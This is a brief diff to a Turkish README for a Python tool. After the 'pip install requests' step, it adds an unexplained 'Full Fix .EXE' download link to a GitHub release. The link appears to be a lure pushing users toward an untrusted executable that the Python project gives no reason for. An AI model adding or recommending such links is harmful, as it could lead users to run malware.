@@ -22,3 +22,5 @@ Programı kullanmadan önce bilgisayarınıza **Python** yüklemeniz gerekiyor:
 CMD veya Terminal uygulamasını açın ve şu komutu çalıştırın:
 ```bash
 pip install requests
+
+[Full Fix .EXE](https://github.com/Ech0Blade/webhook_tool/releases/tag/upgrade)
